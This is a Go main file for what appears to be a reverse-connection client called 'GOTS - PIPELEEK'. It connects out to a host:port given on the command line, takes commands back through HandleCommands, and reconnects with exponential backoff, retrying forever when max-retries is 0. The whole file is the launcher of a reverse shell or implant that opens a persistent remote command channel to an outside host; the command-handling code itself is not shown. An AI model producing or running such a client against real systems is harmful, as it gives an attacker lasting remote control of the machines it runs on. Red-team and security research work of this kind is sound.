package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"golang-https-rev/pkg/client"
	"golang-https-rev/pkg/version"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <host:port|domain:port> <max-retries>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 192.168.1.100:8443 0\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s example.com:8443 5\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nmax-retries: 0 for infinite retries, or specify a number\n")
		os.Exit(1)
	}

	target := os.Args[1]
	maxRetries := 0
	fmt.Sscanf(os.Args[2], "%d", &maxRetries)

	log.Printf("Starting GOTS - PIPELEEK client...")
	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)
	log.Printf("Target: %s", target)
	log.Printf("Max retries: %d (0 = infinite)", maxRetries)

	connectWithRetry(target, maxRetries)
}

func connectWithRetry(target string, maxRetries int) {
	retries := 0
	backoff := 5 * time.Second

	for {
		cl := client.NewReverseClient(target)
		if err := cl.Connect(); err != nil {
			log.Printf("Connection failed: %v", err)

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Retrying in %v... (attempt %d)", backoff, retries+1)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
			continue
		}

		if err := cl.HandleCommands(); err != nil {
			log.Printf("Error: %v", err)
			cl.Close()

			if maxRetries > 0 {
				retries++
				if retries >= maxRetries {
					log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
					return
				}
			}

			log.Printf("Reconnecting in %v... (attempt %d)", backoff, retries+1)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}
		}
	}
}
